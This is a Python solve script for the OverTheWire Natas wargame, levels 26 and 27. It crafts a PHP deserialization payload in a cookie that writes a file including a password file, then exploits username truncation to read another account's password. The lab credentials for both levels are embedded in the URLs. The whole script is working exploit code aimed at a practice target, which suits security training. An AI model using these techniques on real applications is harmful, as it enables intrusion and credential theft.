import requests
import re
import binascii
import base64
from urllib.parse import quote
from itertools import cycle
import string


from phpserialize import serialize, phpobject, dumps
class Logger():
    def __init__(self,initMsg,exitMsg,logFile):
        self.initMsg=initMsg
        self.exitMsg=exitMsg
        self.logFile=logFile
def object_hook(obj):
    if isinstance(obj, Logger):
        return phpobject('Logger', {b'\x00Logger\x00initMsg': obj.initMsg, b'\x00Logger\x00exitMsg': obj.exitMsg, b'\x00Logger\x00logFile': obj.logFile})

def natas27(url):
     session = requests.Session()
     data = dict(username='natas28' + ' '*60 + 'hackz', password='')
     session.post(url, data=data)
     data = dict(username='natas28', password='')
     response = session.post(url, data=data)
     print(re.findall(r"\[password] =&gt; (.{32})", response.text)[0])

def natas26(url):
    session = requests.Session()
    
    logger = Logger("","<?php include('/etc/natas_webpass/natas27');?>","img/code.php")
    
    new_ser = base64.encodestring(serialize(logger, object_hook=object_hook)).replace(b'\n',b'')
    # http://sandbox.onlinephpfunctions.com/code/7f2528c6bf606e2b2fe3e8676543df4cb11ae316
    cookie = dict(drawing=new_ser.decode())
    
    session.get(f"{url}", cookies=cookie)
    response = session.get(f"{url}img/code.php")
    
    print(re.findall(r"(.{32})", response.text))

if __name__ == '__main__':
    url = 'http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org/'
    natas26(url)
    
    url = 'http://natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ@natas27.natas.labs.overthewire.org/'
    natas27(url)
